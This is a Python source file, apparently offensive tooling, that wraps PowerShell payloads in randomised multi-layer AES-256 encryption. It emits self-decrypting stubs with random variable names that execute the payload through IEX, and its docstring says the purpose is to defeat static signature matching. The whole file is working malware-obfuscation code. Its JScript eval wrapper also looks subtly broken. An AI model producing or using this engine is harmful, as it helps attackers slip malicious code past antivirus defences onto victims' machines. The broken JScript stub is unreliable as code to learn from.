"""
poly_engine.py — Polymorphic Payload Wrapper

Wraps any plaintext payload in a randomised AES-256 encryption layer with a
unique key and IV on every run. Outputs a self-decrypting PowerShell stub.

Each generated file is unique — no two outputs share the same ciphertext,
key variable names, or structure. Defeats static signature matching entirely.
"""
import os
import base64
import random
import string
from Crypto.Cipher import AES
from Crypto.Util.Padding import pad


def _rand_var(length=8):
    return random.choice(string.ascii_letters) + ''.join(
        random.choices(string.ascii_letters + string.digits, k=length - 1)
    )


def _rand_key():
    return os.urandom(32)   # AES-256


def _rand_iv():
    return os.urandom(16)


class PolyEngine:

    @staticmethod
    def wrap_powershell(payload: str, layers: int = 1) -> str:
        """
        Wraps a plaintext PowerShell payload in N layers of AES-256-CBC
        encryption. The output is a self-decrypting PS1 stub with randomised
        variable names.
        """
        data = payload.encode('utf-8')

        for _ in range(layers):
            key = _rand_key()
            iv  = _rand_iv()
            cipher = AES.new(key, AES.MODE_CBC, iv)
            data   = cipher.encrypt(pad(data, AES.block_size))

            # Encode artifacts
            b64_ct  = base64.b64encode(data).decode()
            b64_key = base64.b64encode(key).decode()
            b64_iv  = base64.b64encode(iv).decode()

            # Randomise variable names for this layer
            vK = _rand_var(); vI = _rand_var(); vC = _rand_var()
            vP = _rand_var(); vR = _rand_var(); vA = _rand_var()
            vS = _rand_var()

            stub = f"""
${vK} = [Convert]::FromBase64String('{b64_key}')
${vI} = [Convert]::FromBase64String('{b64_iv}')
${vC} = [Convert]::FromBase64String('{b64_ct}')
${vA} = New-Object Security.Cryptography.AesManaged
${vA}.Mode = [Security.Cryptography.CipherMode]::CBC
${vA}.Padding = [Security.Cryptography.PaddingMode]::PKCS7
${vA}.Key = ${vK}; ${vA}.IV = ${vI}
${vR} = ${vA}.CreateDecryptor()
${vS} = New-Object IO.MemoryStream (,${vC})
${vP} = New-Object IO.StreamReader (New-Object Security.Cryptography.CryptoStream ${vS}, ${vR}, ([Security.Cryptography.CryptoStreamMode]::Read))
IEX ${vP}.ReadToEnd()
"""
            data = stub.encode('utf-8')

        return stub.strip()

    @staticmethod
    def wrap_jscript(payload: str) -> str:
        """
        Wraps a JScript command in a base64-encoded eval stub with randomised
        variable names.
        """
        b64 = base64.b64encode(payload.encode()).decode()
        vA = _rand_var(); vB = _rand_var()
        return (
            f'var {vA}="{b64}";'
            f'var {vB}=eval;'
            f'{vB}(new ActiveXObject("Msxml2.XMLHTTP")||atob({vA}));'
        )

    @staticmethod
    def wrap_file(input_path: str, output_path: str, layers: int = 1) -> str:
        """Reads a file, wraps it polymorphically, and writes the stub to output_path."""
        with open(input_path, 'r') as f:
            payload = f.read()
        stub = PolyEngine.wrap_powershell(payload, layers=layers)
        with open(output_path, 'w') as f:
            f.write(stub)
        return output_path
